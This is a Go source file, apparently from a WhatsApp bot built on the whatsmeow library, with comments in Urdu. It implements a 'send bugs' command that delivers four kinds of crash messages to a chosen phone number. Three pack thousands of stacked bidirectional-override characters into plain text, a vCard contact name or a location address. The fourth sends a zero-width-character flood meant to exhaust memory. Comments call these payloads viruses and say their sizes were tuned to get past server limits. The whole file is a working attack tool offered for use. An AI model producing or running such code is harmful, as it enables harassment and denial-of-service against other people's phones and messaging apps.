package main

import (
	"context"
	"fmt"
	"strings"

	"go.mau.fi/whatsmeow"
	"go.mau.fi/whatsmeow/proto/waProto"
	"go.mau.fi/whatsmeow/types"
	"go.mau.fi/whatsmeow/types/events"
	"google.golang.org/protobuf/proto"
)

// ---------------------------------------------------------
// 🏗️ HELPER: وائرس بنانے والا فنکشن
// ---------------------------------------------------------
// ---------------------------------------------------------
// 🏗️ HELPER: وائرس جنریٹر (صرف "پلس" لاجک)
// ---------------------------------------------------------
func generateCrashPayload(length int) string {
	// \u202c (PDF/Close) کو نکال دیا ہے تاکہ لیئرز بند نہ ہوں
	openers := "\u202e\u202b\u202d" // RLO, RLE, LRO
	return strings.Repeat(openers, length)
}

// ---------------------------------------------------------
// 🚀 BUG HANDLER FUNCTION
// ---------------------------------------------------------
func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
	bugType := args[0]
	targetNum := args[1]

	// 1. نمبر فارمیٹنگ
	if !strings.Contains(targetNum, "@") {
		targetNum += "@s.whatsapp.net"
	}
	jid, err := types.ParseJID(targetNum)
	if err != nil {
		replyMessage(client, v, "❌ غلط نمبر!")
		return
	}

	var msg *waProto.Message
	var bugName string

	// 2. چاروں لاجکس (479 Error سے بچنے کے لیے سائز کم کیا ہے)
	switch bugType {
	
	// 🔥 TYPE 1: Text Bomb (Nested Layers)
	case "1":
		bugName = "Text Nester (Type 1)"
		// 2500 بہترین سائز ہے (نہ بہت بڑا، نہ بہت چھوٹا)
		payload := "🚨 T-BUG 1 🚨\n" + generateCrashPayload(2500)
		msg = &waProto.Message{Conversation: proto.String(payload)}

	// 📇 TYPE 2: VCard Bomb (Contact Parser)
	case "2":
		bugName = "VCard Parser (Type 2)"
		// کانٹیکٹ نام میں وائرس
		virusName := generateCrashPayload(2000)
		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", virusName, virusName)
		msg = &waProto.Message{
			ContactMessage: &waProto.ContactMessage{
				DisplayName: proto.String("🔥 Virus 🔥"),
				Vcard:       proto.String(vcard),
			},
		}

	// 📍 TYPE 3: Location Bomb (UI Renderer)
	case "3":
		bugName = "Location UI (Type 3)"
		// ایڈریس بار میں وائرس
		virusAddr := generateCrashPayload(2000)
		msg = &waProto.Message{
			LocationMessage: &waProto.LocationMessage{
				DegreesLatitude:  proto.Float64(24.8607),
				DegreesLongitude: proto.Float64(67.0011),
				Name:             proto.String("🚨 Crash Point"),
				Address:          proto.String(virusAddr),
			},
		}

	// 📝 TYPE 4: Silent Flood (Memory Killer)
	case "4":
		bugName = "Memory Flood (Type 4)"
		// یہ نظر نہیں آتا (Zero Width) لیکن میموری بھرتا ہے
		// اس کا سائز تھوڑا بڑا رکھا جا سکتا ہے کیونکہ یہ سادہ ہے
		flood := strings.Repeat("\u200b\u200c\u200d", 8000) 
		msg = &waProto.Message{
			ExtendedTextMessage: &waProto.ExtendedTextMessage{
				Text: proto.String("🚨 SILENT 🚨" + flood),
			},
		}

	default:
		replyMessage(client, v, "❌ غلط ٹائپ! 1, 2, 3, 4 میں سے چنیں۔")
		return
	}

	// 3. بھیجنا
	fmt.Printf("🚀 Sending %s to %s\n", bugName, targetNum)
	
	// پہلے وارننگ (آپشنل)
	// replyMessage(client, v, "🚀 Sending "+bugName+"...")

	_, err = client.SendMessage(context.Background(), jid, msg)
	if err != nil {
		fmt.Println("❌ Error:", err)
		replyMessage(client, v, "❌ Error: "+err.Error()) // اگر 479 آیا تو یہاں شو ہوگا
	} else {
		replyMessage(client, v, "✅ "+bugName+" Sent!")
	}
}

// چھوٹا ہیلپر فنکشن (اگر نہیں ہے تو یہ بھی لگا لیں)
func replyMessage(client *whatsmeow.Client, v *events.Message, text string) {
	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
		Conversation: proto.String(text),
	})
}
